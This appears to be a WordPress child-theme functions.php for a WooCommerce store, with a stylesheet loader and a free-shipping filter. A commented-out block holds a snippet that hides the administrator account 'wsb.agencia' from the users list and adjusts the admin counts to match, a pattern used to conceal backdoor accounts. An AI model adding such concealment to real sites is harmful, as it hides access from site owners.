<?php
/**
 * Theme functions and definitions
 */

/**
 * Load child theme css and optional scripts
 *
 * @return void
 */
function hello_elementor_child_enqueue_scripts() {
	wp_enqueue_style(
		'hello-elementor-child-style',
		get_stylesheet_directory_uri() . '/style.css',
		[
			'hello-elementor-theme-style',
		],
		'1.0.0'
	);
}
/**
add_action( 'wp_enqueue_scripts', 'hello_elementor_child_enqueue_scripts', 20 );
//* Hide this administrator account from the users list
add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if ($username == 'wsb.agencia') {
	}
	else {
	global $wpdb;   
  }
}
//* Show number of admins minus 1
add_filter("views_users", "site_list_table_views");
function site_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = ' ';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}*/
// Seguridad, checkout fiscal (CUIT/IVA), «Oferta» y emails diferidos: plugin distribuidora-lunic (módulos security y checkout).

// Ocultar otros métodos de envío cuando el envío gratuito está disponible.
function my_hide_shipping_when_free_is_available( $rates ) {
$free = array();
foreach ( $rates as $rate_id => $rate ) {
if ( 'free_shipping' === $rate->method_id ) {
$free[ $rate_id ] = $rate;
break;
}
}
return ! empty( $free ) ? $free : $rates;
}
add_filter( 'woocommerce_package_rates', 'my_hide_shipping_when_free_is_available', 100 );